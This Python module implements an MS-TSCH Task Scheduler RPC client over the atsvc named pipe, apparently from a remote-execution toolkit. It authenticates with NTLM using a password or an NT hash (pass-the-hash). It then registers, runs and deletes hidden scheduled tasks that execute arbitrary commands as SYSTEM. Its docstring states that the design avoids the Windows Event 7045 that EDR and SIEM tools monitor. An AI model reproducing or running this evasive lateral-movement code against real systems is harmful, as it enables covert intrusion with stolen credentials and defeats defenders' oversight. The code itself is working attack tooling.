"""MS-TSCH (Task Scheduler Service) RPC interface.

Creates and runs a scheduled task via \\pipe\\atsvc instead of SVCCTL,
avoiding Event 7045 (new service installed) which EDR/SIEM heavily monitors.

Uses PKT_PRIVACY (NTLM seal/sign on every PDU) as required by Win11 24H2.

Interface UUID: 86D35949-83C9-4044-B424-DB363231FD0C v1.0
Reference: [MS-TSCH] https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch
"""

import struct

from .core import (
    build_bind_auth,
    parse_bind_ack_auth,
    build_auth3,
    build_sealed_request,
    parse_sealed_response,
)
from .ndr import ndr_wstring, ndr_wstring_data, ndr_dword, ndr_wstring_null
from .ntlm import negotiate, authenticate, SealContext

TSCH_UUID = (
    b"\x49\x59\xD3\x86\xC9\x83\x44\x40\xB4\x24\xDB\x36\x32\x31\xFD\x0C"
)
TSCH_VERSION = (1, 0)

TASK_CREATE = 2
TASK_LOGON_NONE = 0

TASK_XML = (
    '<?xml version="1.0" encoding="UTF-16"?>'
    '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
    "<Triggers><CalendarTrigger>"
    "<StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>"
    "<Enabled>true</Enabled>"
    "<ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>"
    "</CalendarTrigger></Triggers>"
    '<Principals><Principal id="S">'
    "<UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel>"
    "</Principal></Principals>"
    "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"
    "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
    "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>"
    "<AllowHardTerminate>true</AllowHardTerminate>"
    "<AllowStartOnDemand>true</AllowStartOnDemand>"
    "<Enabled>true</Enabled><Hidden>true</Hidden>"
    "<ExecutionTimeLimit>PT1H</ExecutionTimeLimit></Settings>"
    '<Actions Context="S"><Exec>'
    "<Command>{cmd}</Command><Arguments>{args}</Arguments>"
    "</Exec></Actions></Task>"
)

TASK_XML_DELAYED = (
    '<?xml version="1.0" encoding="UTF-16"?>'
    '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
    "<Triggers><RegistrationTrigger>"
    "<Delay>PT{delay}S</Delay>"
    "<Enabled>true</Enabled>"
    "</RegistrationTrigger></Triggers>"
    '<Principals><Principal id="S">'
    "<UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel>"
    "</Principal></Principals>"
    "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"
    "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
    "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>"
    "<AllowHardTerminate>true</AllowHardTerminate>"
    "<AllowStartOnDemand>false</AllowStartOnDemand>"
    "<Enabled>true</Enabled><Hidden>true</Hidden>"
    "<ExecutionTimeLimit>PT1H</ExecutionTimeLimit></Settings>"
    '<Actions Context="S"><Exec>'
    "<Command>{cmd}</Command><Arguments>{args}</Arguments>"
    "</Exec></Actions></Task>"
)


class TaskScheduler:
    """MS-TSCH RPC client using NTLM-sealed DCE/RPC over a named pipe."""

    def __init__(self, pipe):
        self._pipe = pipe
        self._seal = None
        self._call_id = 0

    def bind(self, username: str, password: str | None = None,
             nt_hash: str | None = None) -> None:
        """NTLM-authenticated BIND + AUTH3 at PKT_PRIVACY level."""
        tok1 = negotiate()
        pdu = build_bind_auth(TSCH_UUID, TSCH_VERSION, tok1)
        self._pipe.write(pdu)
        resp = self._pipe.read(4096)
        tok2 = parse_bind_ack_auth(resp)

        tok3, session_key = authenticate(
            tok2, username, password=password, nt_hash_hex=nt_hash,
        )
        pdu = build_auth3(tok3)
        self._pipe.write(pdu)

        self._seal = SealContext(session_key)

    @staticmethod
    def _xml_esc(s: str) -> str:
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

    def register_task(self, path: str, command: str, arguments: str) -> None:
        xml = TASK_XML.format(cmd=self._xml_esc(command),
                              args=self._xml_esc(arguments))
        stub = (
            ndr_wstring(path)           # [unique] path
            + ndr_wstring_data(xml)     # [ref] xml
            + ndr_dword(TASK_CREATE)    # flags
            + ndr_wstring_null()        # sddl = NULL
            + ndr_dword(TASK_LOGON_NONE)
            + ndr_dword(0)              # cCreds
            + ndr_dword(0)              # pCreds = NULL
        )
        self._call(1, stub)

    def register_task_delayed(self, path: str, command: str,
                              arguments: str, delay: int = 5) -> None:
        xml = TASK_XML_DELAYED.format(cmd=self._xml_esc(command),
                                      args=self._xml_esc(arguments),
                                      delay=delay)
        stub = (
            ndr_wstring(path)
            + ndr_wstring_data(xml)
            + ndr_dword(TASK_CREATE)
            + ndr_wstring_null()
            + ndr_dword(TASK_LOGON_NONE)
            + ndr_dword(0)
            + ndr_dword(0)
        )
        self._call(1, stub)

    def run_task(self, path: str) -> None:
        stub = (
            ndr_wstring_data(path)      # [ref] path
            + ndr_dword(0)              # cArgs
            + ndr_dword(0)              # pArgs = NULL
            + ndr_dword(0)              # flags
            + ndr_dword(0)              # sessionId
            + ndr_dword(0)              # user = NULL
        )
        self._call(12, stub)

    def delete_task(self, path: str) -> None:
        stub = ndr_wstring_data(path) + ndr_dword(0)
        self._call(13, stub)

    def _call(self, opnum: int, stub_data: bytes) -> bytes:
        self._call_id += 1
        pdu = build_sealed_request(opnum, stub_data, self._seal, self._call_id)
        self._pipe.write(pdu)
        resp_data = self._pipe.read(65536)
        resp = parse_sealed_response(resp_data, self._seal)
        hr = struct.unpack_from("<i", resp, len(resp) - 4)[0]
        if hr != 0:
            raise RuntimeError(
                f"TSCH opnum {opnum} failed: 0x{hr & 0xFFFFFFFF:08X}"
            )
        return resp
